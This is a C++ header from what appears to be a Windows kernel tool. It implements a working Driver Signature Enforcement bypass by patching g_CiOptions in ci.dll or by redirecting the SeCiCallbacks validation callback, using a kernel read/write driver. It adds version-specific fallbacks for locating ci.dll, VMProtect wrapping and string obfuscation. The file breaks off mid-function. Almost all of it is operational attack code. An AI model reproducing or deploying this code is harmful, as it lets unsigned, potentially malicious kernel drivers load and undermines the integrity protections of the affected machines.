#pragma once
#include "includes.hpp"
#include "kvc_drv.hpp"
#include "symbol_engine.hpp"
#include "session_manager.hpp"
#include "log.hpp"
#include "VMProtectSDK.h"   // VMProtect 3.x SDK
// ntdll functions resolved dynamically via GetModuleHandleW+GetProcAddress (see dse_bypass internals)

//=============================================================================
//  dse_bypass.hpp  –  Unified DSE bypass: Standard + Safe method
//
//  Mirrors kvc-main / DSEBypass.cpp both methods 1-to-1.
//
//  Method::Standard  – g_CiOptions patching (ci.dll CiPolicy section)
//    • DisableStandard / RestoreStandard
//    • Does NOT work when HVCI/Memory Integrity is enabled
//    • kvc: "only works with 0x00000006 value (no HVCI)"
//
//  Method::Safe      – SeCiCallbacks pointer redirect (PDB-based, kvc default)
//    • DisableSafe / RestoreSafe
//    • Patches SeCiCallbacks[+0x20] → ZwFlushInstructionCache
//    • Works regardless of HVCI state; preserves VBS functionality
//    • Requires ntoskrnl.pdb (downloaded from msdl.microsoft.com if absent)
//    • Original callback is persisted in registry for cross-session restore
//
//  Used by kvc ControllerDriverLoader.cpp::LoadExternalDriver() as Method::Safe.
//  kvc ControllerDSE.cpp::HandleDSEOff/On() supports both methods.
//=============================================================================

namespace detail_dse {

typedef struct _SYSTEM_MODULE {
    ULONG_PTR   Reserved1;
    ULONG_PTR   Reserved2;
    PVOID       ImageBase;
    ULONG       ImageSize;
    ULONG       Flags;
    USHORT      LoadOrderIndex;
    USHORT      InitOrderIndex;
    USHORT      LoadCount;
    USHORT      PathLength;
    CHAR        ImageName[256];
} SYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG         Count;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION;

typedef NTSTATUS( WINAPI* PFN_NtQuerySystemInformation )(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength );

static constexpr ULONG     SystemModuleInformation     = 11;
static constexpr NTSTATUS  STATUS_INFO_LENGTH_MISMATCH = (NTSTATUS)0xC0000004L;

// ── Windows build number (uses RtlGetVersion so it never lies) ────────────────
// Returns the numeric build, e.g. 22621 for Win11 22H2, 26100 for Win11 24H2.
inline DWORD GetWindowsBuildNumber() noexcept
{
    typedef NTSTATUS( WINAPI* PFN_RtlGetVersion )( PRTL_OSVERSIONINFOW );
    HMODULE hNtdll = ::GetModuleHandleW( WOBF( L"ntdll.dll" ) );
    if ( !hNtdll ) return 0;
    auto pRtlGetVersion = reinterpret_cast<PFN_RtlGetVersion>(
        ::GetProcAddress( hNtdll, OBF( "RtlGetVersion" ) ) );
    if ( !pRtlGetVersion ) return 0;
    RTL_OSVERSIONINFOW ov{};
    ov.dwOSVersionInfoSize = sizeof( ov );
    if ( pRtlGetVersion( &ov ) != 0 ) return 0;
    return ov.dwBuildNumber;
}

// Helper: enumerate loaded kernel modules once, query by name.
// Returns both the base VA and the mapped image size.
struct KernelModuleInfo { ULONG_PTR base; ULONG size; };

inline std::optional<KernelModuleInfo>
GetKernelModuleInfo( const char* moduleName ) noexcept
{
    HMODULE hNtdll = ::GetModuleHandleW( WOBF( L"ntdll.dll" ) );
    if ( !hNtdll ) return std::nullopt;

    auto pNtQSI = reinterpret_cast<PFN_NtQuerySystemInformation>(
        ::GetProcAddress( hNtdll, OBF( "NtQuerySystemInformation" ) ) );
    if ( !pNtQSI ) return std::nullopt;

    ULONG bufferSize = 0;
    NTSTATUS st = pNtQSI( SystemModuleInformation, nullptr, 0, &bufferSize );
    if ( st != STATUS_INFO_LENGTH_MISMATCH ) return std::nullopt;
    bufferSize += 4096;   // extra slack: avoid race between size-query and alloc

    auto buffer = std::make_unique<BYTE[]>( bufferSize );
    auto pMods  = reinterpret_cast<SYSTEM_MODULE_INFORMATION*>( buffer.get() );

    st = pNtQSI( SystemModuleInformation, pMods, bufferSize, &bufferSize );
    if ( st != 0 ) return std::nullopt;

    for ( ULONG i = 0; i < pMods->Count; ++i ) {
        const char* fn   = pMods->Modules[i].ImageName;
        const char* base = strrchr( fn, '\\' );
        base = base ? base + 1 : fn;
        // Some builds use forward-slash separators in the module path
        const char* baseF = strrchr( fn, '/' );
        if ( baseF && ( baseF + 1 ) > base ) base = baseF + 1;

        if ( _stricmp( base, moduleName ) == 0 ) {
            ULONG_PTR addr = reinterpret_cast<ULONG_PTR>( pMods->Modules[i].ImageBase );
            if ( addr == 0 ) continue;
            return KernelModuleInfo{ addr, pMods->Modules[i].ImageSize };
        }
    }
    // ── EnumDeviceDrivers fallback (Win11 25H2: ci.dll absent from NtQSI) ────
    //  Obtain the kernel VA from EnumDeviceDrivers / GetDeviceDriverFileNameW,
    //  then read the PE SizeOfImage from disk to supply the size field.
    {
        HMODULE hK32 = ::GetModuleHandleW( L"kernel32.dll" );
        if ( !hK32 ) return std::nullopt;

        typedef BOOL(WINAPI* PFN_EDD)(LPVOID*, DWORD, LPDWORD);
        typedef BOOL(WINAPI* PFN_GDDFN)(LPVOID, LPWSTR, DWORD);
        auto pfnEDD  = reinterpret_cast<PFN_EDD> ( ::GetProcAddress( hK32, "EnumDeviceDrivers" ) );
        auto pfnGDDF = reinterpret_cast<PFN_GDDFN>( ::GetProcAddress( hK32, "GetDeviceDriverFileNameW" ) );
        if ( !pfnEDD || !pfnGDDF ) return std::nullopt;

        LPVOID drv[4096]{};
        DWORD  need = 0;
        if ( !pfnEDD( drv, sizeof( drv ), &need ) ) return std::nullopt;

        const DWORD cnt = need / sizeof( LPVOID );
        for ( DWORD i = 0; i < cnt; ++i ) {
            wchar_t buf[MAX_PATH]{};
            if ( !pfnGDDF( drv[i], buf, MAX_PATH ) ) continue;

            // Extract filename from NT path
            const wchar_t* fn = wcsrchr( buf, L'\\' );
            const wchar_t* fnF = wcsrchr( buf, L'/' );
            if ( fnF && fnF + 1 > fn ) fn = fnF;
            const wchar_t* wfn = fn ? fn + 1 : buf;

            // Convert moduleName to wide for comparison
            wchar_t wmod[256]{};
            ::MultiByteToWideChar( CP_ACP, 0, moduleName, -1, wmod, 255 );

            if ( _wcsicmp( wfn, wmod ) != 0 ) continue;

            const ULONG_PTR base = reinterpret_cast<ULONG_PTR>( drv[i] );
            if ( base == 0 ) continue;

            // Get disk path to read SizeOfImage from PE header
            std::wstring diskPath;
            std::wstring ntPath = buf;
            if ( ntPath.find( L"\\SystemRoot\\") == 0 ) {
                wchar_t winDir[MAX_PATH]{};
                ::GetWindowsDirectoryW( winDir, MAX_PATH );
                diskPath = std::wstring( winDir ) + ntPath.substr( 11 );
            } else if ( ntPath.find( L"\\??\\") == 0 ) {
                diskPath = ntPath.substr( 4 );
            } else {
                diskPath = ntPath;
            }

            ULONG sizeOfImage = 0x200000;  // conservative fallback (2 MB)
            {
                HANDLE hf = ::CreateFileW( diskPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
                if ( hf != INVALID_HANDLE_VALUE ) {
                    HANDLE hm = ::CreateFileMappingW( hf, nullptr, PAGE_READONLY, 0, 0, nullptr );
                    if ( hm ) {
                        auto* pb = static_cast<BYTE*>( ::MapViewOfFile( hm, FILE_MAP_READ, 0, 0, 0 ) );
                        if ( pb ) {
                            auto* dos  = reinterpret_cast<PIMAGE_DOS_HEADER>( pb );
                            if ( dos->e_magic == IMAGE_DOS_SIGNATURE ) {
                                auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS64>( pb + dos->e_lfanew );
                                if ( nt->Signature == IMAGE_NT_SIGNATURE )
                                    sizeOfImage = nt->OptionalHeader.SizeOfImage;
                            }
                            ::UnmapViewOfFile( pb );
                        }
                        ::CloseHandle( hm );
                    }
                    ::CloseHandle( hf );
                }
            }
            return KernelModuleInfo{ base, sizeOfImage };
        }
    }

    return std::nullopt;
}

// Exact copy of kvc DSEBypass::GetKernelModuleBase (kept for callers that only need the base)
inline std::optional<ULONG_PTR> GetKernelModuleBase( const char* moduleName ) noexcept
{
    auto info = GetKernelModuleInfo( moduleName );
    if ( !info ) return std::nullopt;
    return info->base;
}

// ── FindCiOptionsKernelAddr ───────────────────────────────────────────────────
//  Maps ci.dll from disk, finds the "CiPolicy" section, and returns the kernel
//  VA of g_CiOptions (= ci_kernel_base + CiPolicy_RVA + 4).
//
//  This is far more reliable than reading the PE headers byte-by-byte via IOCTL:
//    • No byte-level IOCTL overhead / fragmentation
//    • Works even when KASLR makes kernel reads unreliable at section-header VAs
//    • Only two IOCTL ops needed afterwards (one Read32 verify + one Write32)
//
//  Returns 0 on any failure.
//
//  ciBaseOverride – when non-zero, skips GetKernelModuleInfo (used by
//  dse_bypass when ci.dll was found via IAT on 25H2+).
inline ULONG_PTR FindCiOptionsKernelAddr( ULONG_PTR ciBaseOverride = 0 ) noexcept
{
    // 1. ci.dll kernel base ──────────────────────────────────────────────────
    ULONG_PTR ciBaseToUse = ciBaseOverride;
    if ( ciBaseToUse == 0 ) {
        auto ciInfo = GetKernelModuleInfo( OBF( "ci.dll" ) );
        if ( !ciInfo ) {
            dlog::write( L"[detail_dse::FindCiOptionsKernelAddr] FAIL \u2013 ci.dll not in kernel module list" );
            return 0;
        }
        ciBaseToUse = ciInfo->base;
    }

    // 2. ci.dll disk path  ───────────────────────────────────────────────────
    //  EnumDeviceDrivers/GetDeviceDriverFileName gives the NT device path.
    std::wstring ciPath;
    {
        LPVOID drv[4096]{};
        DWORD  need = 0;
        if ( lazy::k32::get().EnumDeviceDrivers( drv, sizeof( drv ), &need ) ) {
            const DWORD cnt = need / sizeof( LPVOID );
            for ( DWORD i = 0; i < cnt && ciPath.empty(); ++i ) {
                wchar_t buf[MAX_PATH]{};
                if ( !lazy::k32::get().GetDeviceDriverFileNameW( drv[i], buf, MAX_PATH ) ) continue;
                std::wstring wn = buf;
                auto pos = wn.find_last_of( L"\\/" );
                std::wstring fn = ( pos != std::wstring::npos ) ? wn.substr( pos + 1 ) : wn;
                if ( _wcsicmp( fn.c_str(), WOBF( L"ci.dll" ) ) != 0 ) continue;
                // NT → DOS path
                if ( wn.find( L"\\SystemRoot\\" ) == 0 ) {
                    wchar_t winDir[MAX_PATH]{};
                    ::GetWindowsDirectoryW( winDir, MAX_PATH );
                    ciPath = std::wstring( winDir ) + wn.substr( 11 );
                } else if ( wn.find( L"\\??\\" ) == 0 ) {
                    ciPath = wn.substr( 4 );
                } else {
                    ciPath = wn;
                }
            }
        }
    }
    if ( ciPath.empty() ) {
        // Fallback: assume default location
        wchar_t sysDir[MAX_PATH]{};
        ::GetSystemDirectoryW( sysDir, MAX_PATH );
        ciPath = std::wstring( sysDir ) + WOBFS( L"\\ci.dll" );
        dlog::write( std::format( L"[detail_dse::FindCiOptionsKernelAddr] EnumDeviceDrivers FAIL \u2013 using fallback path: {}", ciPath ) );
    }

    // 3. Map ci.dll, find CiPolicy section RVA ─────────────────────────────
    HANDLE hFile = lazy::k32::get().CreateFileW( ciPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
    if ( hFile == INVALID_HANDLE_VALUE ) {
        dlog::write( std::format( L"[detail_dse::FindCiOptionsKernelAddr] FAIL \u2013 cannot open '{}' (GLE {})",
                                  ciPath, ::GetLastError() ) );
        return 0;
    }
    HANDLE hMap = lazy::k32::get().CreateFileMappingW( hFile, nullptr, PAGE_READONLY, 0, 0, nullptr );
    if ( !hMap ) { ::CloseHandle( hFile ); return 0; }
    auto* pBase = static_cast<BYTE*>( lazy::k32::get().MapViewOfFile( hMap, FILE_MAP_READ, 0, 0, 0 ) );
    if ( !pBase ) { ::CloseHandle( hMap ); ::CloseHandle( hFile ); return 0; }

    ULONG_PTR result = 0;
    auto cleanup = [&]{ lazy::k32::get().UnmapViewOfFile( pBase ); ::CloseHandle( hMap ); ::CloseHandle( hFile ); };

    auto* pDOS = reinterpret_cast<PIMAGE_DOS_HEADER>( pBase );
    if ( pDOS->e_magic != IMAGE_DOS_SIGNATURE ) { cleanup(); return 0; }
    auto* pNT = reinterpret_cast<PIMAGE_NT_HEADERS64>( pBase + pDOS->e_lfanew );
    if ( pNT->Signature != IMAGE_NT_SIGNATURE ) { cleanup(); return 0; }

    const WORD  nSec = pNT->FileHeader.NumberOfSections;
    auto*       pSec = IMAGE_FIRST_SECTION( pNT );

    // ── Strategy A: CiPolicy section (Win11) – g_CiOptions = base + VA + 4 ──
    for ( WORD i = 0; i < nSec; ++i ) {
        char sname[9] = {};
        ::memcpy( sname, pSec[i].Name, 8 );
        if ( ::strcmp( sname, OBF( "CiPolicy" ) ) == 0 ) {
            const DWORD rva = pSec[i].VirtualAddress + 4;
            result = ciBaseToUse + rva;
            dlog::write( std::format(
                L"[detail_dse::FindCiOptionsKernelAddr] CiPolicy+4 RVA=0x{:X} \u2192 {:016X}", rva, result ) );
            break;
        }
    }

    // ── Strategy B: CiInitialize export scan (Win10, no CiPolicy section) ────
    //
    //  CiInitialize(ULONG CiOptions, ...) stores its first arg to g_CiOptions
    //  very early in its body via a RIP-relative 32-bit store instruction.
    //  Encodings we recognise (6-byte nonREX or 7-byte with REX.R/REX.B):
    //    [REX]  89  ModRM  disp32   where ModRM & 0xC7 == 0x05  (Mod=00 R/M=101)
    //
    //  We skip any target RVA that falls inside a code section (executable flag)
    //  to avoid false positives from stores into function tables.
    if ( result == 0 )
    {
        // ---------- helpers --------------------------------------------------
        // RVA → file offset (0 = not mapped in this section table)
        auto rvaToFileOff = [&]( DWORD rva ) -> DWORD {
            for ( WORD i = 0; i < nSec; ++i ) {
                const DWORD va  = pSec[i].VirtualAddress;
                const DWORD raw = pSec[i].SizeOfRawData;
                if ( rva >= va && rva < va + raw )
                    return pSec[i].PointerToRawData + ( rva - va );
            }
            return 0;
        };
        // Is the given RVA inside an executable section?
        auto isExecRva = [&]( DWORD rva ) -> bool {
            for ( WORD i = 0; i < nSec; ++i ) {
                if ( rva >= pSec[i].VirtualAddress &&
                     rva <  pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize ) {
                    return ( pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) != 0;
                }
            }
            return false;
        };

        // ---------- find CiInitialize export ---------------------------------
        DWORD ciInitRva = 0;
        {
            const auto& expDir = pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            if ( expDir.VirtualAddress && expDir.Size ) {
                DWORD fOff = rvaToFileOff( expDir.VirtualAddress );
                if ( fOff ) {
                    auto* pExp = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>( pBase + fOff );
                    auto funcOff = rvaToFileOff( pExp->AddressOfFunctions );
                    auto nameOff = rvaToFileOff( pExp->AddressOfNames );
                    auto ordOff  = rvaToFileOff( pExp->AddressOfNameOrdinals );
                    if ( funcOff && nameOff && ordOff ) {
                        auto* funcs = reinterpret_cast<DWORD*>( pBase + funcOff );
                        auto* names = reinterpret_cast<DWORD*>( pBase + nameOff );
                        auto* ords  = reinterpret_cast<WORD* >( pBase + ordOff );
                        for ( DWORD n = 0; n < pExp->NumberOfNames && ciInitRva == 0; ++n ) {
                            DWORD nOff = rvaToFileOff( names[n] );
                            if ( !nOff ) continue;
                            if ( ::strcmp( reinterpret_cast<char*>( pBase + nOff ), OBF( "CiInitialize" ) ) == 0 )
                                ciInitRva = funcs[ ords[n] ];
                        }
                    }
                }
            }
        }

        if ( ciInitRva ) {
            DWORD fOff = rvaToFileOff( ciInitRva );
            if ( fOff ) {
                const BYTE* code    = pBase + fOff;
                const DWORD maxScan = 0x200;  // scan first 512 bytes of CiInitialize

                for ( DWORD k = 0; k + 6 <= maxScan; ++k ) {
                    // Optional single-byte REX prefix (0x40-0x4F)
                    bool hasREX = ( code[k] >= 0x40 && code[k] <= 0x4F );
                    const BYTE* p = code + k + ( hasREX ? 1 : 0 );
                    // Expect opcode 0x89 (MOV r/m32, r32) or 0x8B (MOV r32, r/m32)
                    if ( p[0] != 0x89 && p[0] != 0x8B ) continue;
                    // ModRM: Mod=00, R/M=101 → RIP-relative 32-bit displacement
                    if ( ( p[1] & 0xC7 ) != 0x05 ) continue;
                    // Remaining length check
                    const DWORD instrLen = static_cast<DWORD>( p - code ) + 2 + 4; // REX + op + ModRM + disp32
                    if ( instrLen > maxScan ) break;

                    // Target RVA = RVA of next instruction + sign-extended disp32
                    DWORD disp{}; ::memcpy( &disp, p + 2, 4 );
                    const DWORD nextInstrRva = ciInitRva + instrLen + k;
                    // Watch out: arithmetic is DWORD, intentional wrap for negative disp
                    const DWORD targetRva = nextInstrRva + disp;

                    // Reject if target falls inside an executable section (code ptr)
                    if ( isExecRva( targetRva ) ) continue;
                    // Reject if target is obviously out of image range
                    if ( targetRva >= pNT->OptionalHeader.SizeOfImage ) continue;

                    result = ciBaseToUse + targetRva;
                    dlog::write( std::format(
                        L"[detail_dse::FindCiOptionsKernelAddr] CiInitialize scan: "
                        L"k={} op={:02X} ModRM={:02X} targetRVA=0x{:X} \u2192 {:016X}",
                        k, p[0], p[1], targetRva, result ) );
                    break;
                }
            }
            if ( result == 0 )
                dlog::write( L"[detail_dse::FindCiOptionsKernelAddr] WARN \u2013 CiInitialize scan found no data store" );
        } else {
            dlog::write( L"[detail_dse::FindCiOptionsKernelAddr] WARN \u2013 CiInitialize not found in export table" );
        }
    }

    cleanup();
    if ( result == 0 )
        dlog::write( L"[detail_dse::FindCiOptionsKernelAddr] FAIL \u2013 all strategies exhausted" );
    return result;
}

} // namespace detail_dse

//=============================================================================
//  class dse_bypass
//  Mirrors kvc DSEBypass (Standard + Safe unified manager).
//=============================================================================
class dse_bypass
{
public:

    // ── Method selection (mirrors kvc DSEBypass::Method) ──────────────────────
    enum class Method : uint8_t {
        Standard,   // g_CiOptions modification (no HVCI)
        Safe        // SeCiCallbacks redirect via PDB (works with/without HVCI)
    };

    // ── DSE state for Safe method diagnostics ─────────────────────────────────
    enum class SafeState : uint8_t {
        UNKNOWN,
        NORMAL,      // DSE enabled,  original callback active
        PATCHED,     // DSE disabled, ZwFlush callback active
        CORRUPTED    // Unknown callback value
    };

    explicit dse_bypass( kvc& driver ) : m_drv( driver ) {}

    // ── Disable DSE ───────────────────────────────────────────────────────────
    //  method = Safe  → SeCiCallbacks redirect (kvc default for driver loading)
    //  method = Standard → g_CiOptions clear (requires no HVCI)
    __declspec(noinline) bool Disable( Method method = Method::Safe ) noexcept
    {
        VMProtectBeginUltra( "DSEBypass::Disable" );
        bool r = false;
        switch ( method ) {
        case Method::Standard: r = DisableStandard(); break;
        case Method::Safe:     r = DisableSafe();     break;
        }
        VMProtectEnd();
        return r;
    }

    // ── Restore DSE ───────────────────────────────────────────────────────────
    __declspec(noinline) bool Restore( Method method = Method::Safe ) noexcept
    {
        VMProtectBeginUltra( "DSEBypass::Restore" );
        bool r = false;
        switch ( method ) {
        case Method::Standard: r = RestoreStandard(); break;
        case Method::Safe:     r = RestoreSafe();     break;
        }
        VMProtectEnd();
        return r;
    }

    // ── Status ────────────────────────────────────────────────────────────────
    struct Status {
        ULONG_PTR addr         = 0;
        DWORD     value        = 0;
        bool      dseEnabled   = false;
        bool      hvciEnabled  = false;   // (ciOptions & 0x0001C000) == 0x0001C000
        DWORD64   savedCallback = 0;      // Safe method: last saved CI callback
    };
    // ── Comprehensive status (Standard + Safe) ───────────────────────────────
    //  Mirrors DSEBypass::GetStatus() exactly.
    bool GetStatus( Status& out ) noexcept
    {
        auto ciBase = detail_dse::GetKernelModuleBase( OBF( "ci.dll" ) );
        if ( !ciBase ) return false;

        ULONG_PTR addr = FindCiOptions( ciBase.value() );
        if ( !addr ) return false;

        auto v = m_drv.Read32( addr );
        if ( !v ) return false;

        out.addr          = addr;
        out.value         = v.value();
        out.dseEnabled    = ( v.value() & 0x6 ) != 0;
        out.hvciEnabled   = IsHVCIEnabled( v.value() );
        out.savedCallback = session_manager::GetOriginalCiCallback();

        m_ciOptionsAddr = addr;
        m_originalValue = v.value();
        return true;
    }

    // ── Safe method state (NORMAL / PATCHED / CORRUPTED / UNKNOWN) ───────────
    //  Mirrors DSEBypass::CheckSafeMethodState() exactly.
    SafeState CheckSafeState() noexcept
    {
        auto ki = symbol_engine::GetKernelInfo();
        if ( !ki ) return SafeState::UNKNOWN;
        const auto& [kBase, kPath] = *ki;

        auto offs = m_symEngine.GetSymbolOffsets( kPath );
        if ( !offs ) return SafeState::UNKNOWN;
        const auto& [offSeCi, offZwFlush] = *offs;

        const DWORD64 cbOff       = ( m_safeCallbackOff != 0 )
                                    ? m_safeCallbackOff
                                    : SAFE_CALLBACK_OFFSET_LEGACY;
        const DWORD64 targetAddr  = m_safeIsIndirect
                                  ? ( m_safeIndirectBase + cbOff )
                                  : ( static_cast<DWORD64>( kBase ) + offSeCi + cbOff );
        const DWORD64 safeFunc    = kBase + offZwFlush;

        auto cur = m_drv.Read64( targetAddr );
        if ( !cur ) return SafeState::UNKNOWN;

        if ( *cur == safeFunc ) return SafeState::PATCHED;

        const DWORD64 saved = session_manager::GetOriginalCiCallback();
        if ( saved != 0 && *cur == saved ) return SafeState::NORMAL;

        return SafeState::CORRUPTED;
    }

    // ── Helpers ───────────────────────────────────────────────────────────────
    //  Mirrors DSEBypass::IsHVCIEnabled() exactly.
    static bool IsHVCIEnabled( DWORD ciOptionsValue ) noexcept
    {
        return ( ciOptionsValue & 0x0001C000 ) == 0x0001C000;
    }

    ULONG_PTR GetCiOptionsAddr() const noexcept { return m_ciOptionsAddr; }
    DWORD     GetOriginalValue()  const noexcept { return m_originalValue; }

    // ── RestoreHints – cross-session state transfer ───────────────────────────
    //  Allows a fresh dse_bypass (in the restore kvc session) to replay the
    //  exact same patch location that was found during the disable session,
    //  instead of re-discovering it with potentially different results.
    struct RestoreHints {
        // Standard method
        ULONG_PTR ciOptionsAddr    = 0;
        DWORD     originalCiValue  = 0;
        // Safe method
        DWORD64   safeCallbackOff  = 0;
        bool      safeIsIndirect   = false;
        DWORD64   safeIndirectBase = 0;
        DWORD64   ciDllBase        = 0;
        DWORD     ciDllSize        = 0;
    };

    RestoreHints CaptureRestoreHints() const noexcept
    {
        RestoreHints h;
        h.ciOptionsAddr    = m_ciOptionsAddr;
        h.originalCiValue  = m_originalValue;
        h.safeCallbackOff  = m_safeCallbackOff;
        h.safeIsIndirect   = m_safeIsIndirect;
        h.safeIndirectBase = m_safeIndirectBase;
        h.ciDllBase        = m_ciDllBase;
        h.ciDllSize        = m_ciDllSize;
        return h;
    }

    // Apply previously captured hints so that Restore() uses the exact same
    // addresses as the Disable() call that created them.
    void ApplyRestoreHints( const RestoreHints& h ) noexcept
    {
        m_ciOptionsAddr    = h.ciOptionsAddr;
        m_originalValue    = h.originalCiValue;
        m_safeCallbackOff  = h.safeCallbackOff;
        m_safeIsIndirect   = h.safeIsIndirect;
        m_safeIndirectBase = h.safeIndirectBase;
        m_ciDllBase        = h.ciDllBase;
        m_ciDllSize        = h.ciDllSize;
    }

private:

    // SeCiCallbacks callback slot offset – NOT a compile-time constant.
    // Different CI_CALLBACKS struct layouts across Windows builds put
    // CiValidateImageHeader at different offsets (+0x20 on 25H2, +0x40 on
    // older 22H2/21H2, etc.).  Discovered at runtime by FindSafeCallbackOffset.
    // Kept for RestoreSafe(): once found, persisted in m_safeCallbackOff.
    static constexpr DWORD64 SAFE_CALLBACK_OFFSET_LEGACY = 0x20;  // fallback only

    kvc&          m_drv;
    symbol_engine m_symEngine;      // lazy PDB resolver (Safe method)
    ULONG_PTR     m_ciOptionsAddr   = 0;
    DWORD         m_originalValue   = 0;
    DWORD64       m_safeCallbackOff = 0;   // discovered at runtime per-boot
    bool          m_safeIsIndirect  = false;  // SeCiCallbacks is CI_CALLBACKS* on Win11 25H2+
    DWORD64       m_safeIndirectBase= 0;   // *SeCiCallbacks == ci.dll CI_CALLBACKS address
    DWORD64       m_ciDllBase       = 0;   // ci.dll kernel base (IAT-derived, cached per session)
    DWORD         m_ciDllSize       = 0;   // ci.dll SizeOfImage

    //=========================================================================
    //  STANDARD METHOD – g_CiOptions patching
    //  Mirrors DSEBypass::DisableStandard() / RestoreStandard() exactly.
    //=========================================================================

    bool DisableStandard() noexcept
    {
        // NtQuerySystemInformation may not list ci.dll on Win11 25H2; that is
        // not fatal for the Standard method because FindCiOptionsKernelAddr()
        // uses EnumDeviceDrivers (now also wired into GetKernelModuleInfo) as
        // a fallback.  Only bail if BOTH the disk mapping AND the IOCTL scan fail.
        auto ciBase = detail_dse::GetKernelModuleBase( OBF( "ci.dll" ) );
        if ( !ciBase ) {
            dlog::write( L"[dse_bypass::DisableStandard] WARN \u2013 NtQSI ci.dll base not found; trying IAT" );
        } else {
            dlog::write( std::format( L"[dse_bypass::DisableStandard] ci.dll base (NtQSI): {:016X}", ciBase.value() ) );
        }

        // On 25H2, NtQSI omits ci.dll – use IAT-based finder as authoritative fallback.
        ULONG_PTR ciBaseForMapping = ciBase ? ciBase.value() : 0;
        if ( ciBaseForMapping == 0 ) {
            if ( m_ciDllBase == 0 ) {
                auto ki = symbol_engine::GetKernelInfo();
                if ( ki ) {
                    auto ciDll = FindCiDllKernelBase( static_cast<DWORD64>( ki->first ), ki->second );
                    if ( ciDll.base ) {
                        m_ciDllBase = ciDll.base;
                        m_ciDllSize = ciDll.size;
                    }
                }
            }
            if ( m_ciDllBase ) {
                ciBaseForMapping = static_cast<ULONG_PTR>( m_ciDllBase );
                dlog::write( std::format( L"[dse_bypass::DisableStandard] ci.dll base (IAT): {:016X}", ciBaseForMapping ) );
            }
        }

        // Prefer disk-based mapping (fast, no IOCTL byte-walk) then fall back to IOCTL scan.
        m_ciOptionsAddr = detail_dse::FindCiOptionsKernelAddr( ciBaseForMapping );
        if ( m_ciOptionsAddr ) {
            dlog::write( L"[dse_bypass::DisableStandard] g_CiOptions found via disk mapping" );
        } else if ( ciBaseForMapping ) {
            dlog::write( L"[dse_bypass::DisableStandard] disk mapping FAIL \u2013 trying IOCTL PE scan fallback" );
            m_ciOptionsAddr = FindCiOptions( ciBaseForMapping );
            if ( !m_ciOptionsAddr ) {
                dlog::write( L"[dse_bypass::DisableStandard] FAIL \u2013 FindCiOptions (IOCTL scan) also returned 0" );
                return false;
            }
        } else {
            dlog::write( L"[dse_bypass::DisableStandard] FAIL \u2013 disk mapping failed and ci.dll base unavailable for IOCTL scan" );
            return false;
        }
        dlog::write( std::format( L"[dse_bypass::DisableStandard] g_CiOptions addr: {:016X}", m_ciOptionsAddr ) );

        auto cur = m_drv.Read32( m_ciOptionsAddr );
        if ( !cur ) {
            dlog::write( L"[dse_bypass::DisableStandard] FAIL – Read32 on g_CiOptions failed (kvc IOCTL error)" );
            return false;
        }

        const DWORD currentValue = cur.value();
        m_originalValue = currentValue;
        dlog::write( std::format( L"[dse_bypass::DisableStandard] g_CiOptions current value: 0x{:08X}", currentValue ) );

        // Already disabled
        if ( currentValue == 0x00000000 ) return true;

        // kvc: value != 0x6 → HVCI or unknown state → log info and return true
        // "Standard method only works with 0x00000006 (no HVCI)"
        // "Use modern method: 'kvc dse off --safe'"
        if ( currentValue != 0x00000006 ) {
            dlog::write( std::format( L"[dse_bypass::DisableStandard] g_CiOptions = 0x{:08X} (not 0x6 – HVCI active or non-standard state); treating as success", currentValue ) );
            return true;
        }

        if ( !m_drv.Write32( m_ciOptionsAddr, 0x00000000 ) ) {
            dlog::write( L"[dse_bypass::DisableStandard] FAIL – Write32 g_CiOptions→0 failed" );
            return false;
        }

        auto verify = m_drv.Read32( m_ciOptionsAddr );
        if ( !verify.has_value() || verify.value() != 0x00000000 ) {
            dlog::write( std::format( L"[dse_bypass::DisableStandard] FAIL – verify after write: got 0x{:08X}",
                                      verify.has_value() ? verify.value() : 0xFFFFFFFF ) );
            return false;
        }
        dlog::write( L"[dse_bypass::DisableStandard] g_CiOptions patched → 0x00000000 OK" );
        return true;
    }

    bool RestoreStandard() noexcept
    {
        if ( !m_ciOptionsAddr ) {
            // Try disk-based mapping first, then IOCTL fallback.
            m_ciOptionsAddr = detail_dse::FindCiOptionsKernelAddr();
            if ( !m_ciOptionsAddr ) {
                auto ciBase = detail_dse::GetKernelModuleBase( OBF( "ci.dll" ) );
                if ( !ciBase ) return false;
                m_ciOptionsAddr = FindCiOptions( ciBase.value() );
                if ( !m_ciOptionsAddr ) return false;
            }
        }

        auto cur = m_drv.Read32( m_ciOptionsAddr );
        if ( !cur ) return false;
        const DWORD currentValue = cur.value();

        // Already enabled (bits 1 & 2 set)
        if ( ( currentValue & 0x6 ) != 0 ) return true;

        // Must be 0 before we can restore
        if ( currentValue != 0x00000000 ) return false;

        const DWORD restoreValue = ( m_originalValue != 0 ) ? m_originalValue : 0x00000006;
        if ( !m_drv.Write32( m_ciOptionsAddr, restoreValue ) ) return false;

        auto verify = m_drv.Read32( m_ciOptionsAddr );
        return verify.has_value() && ( verify.value() & 0x6 ) != 0;
    }

    //=========================================================================
    //  IAT-BASED ci.dll KERNEL BASE FINDER
    //
    //  ntoskrnl.exe statically imports from ci.dll.  The IAT slots in the live
    //  kernel hold the actual kernel VAs of those functions.  We map both PEs
    //  from disk and cross-reference to compute:
    //      ci.dll kernel base = IAT[func_in_ntoskrnl] – ci.dll export RVA[func]
    //
    //  This is independent of NtQuerySystemInformation and EnumDeviceDrivers,
    //  both of which omit ci.dll on Windows 11 25H2 (build 26200+).
    //=========================================================================
    struct CiDllInfo { DWORD64 base = 0; DWORD size = 0; };

    CiDllInfo FindCiDllKernelBase( DWORD64 kBase, const std::wstring& kPath ) noexcept
    {
        // ── 1. Map ntoskrnl from disk; collect ci.dll IAT entries ──────────
        HANDLE hNF = lazy::k32::get().CreateFileW( kPath.c_str(), GENERIC_READ,
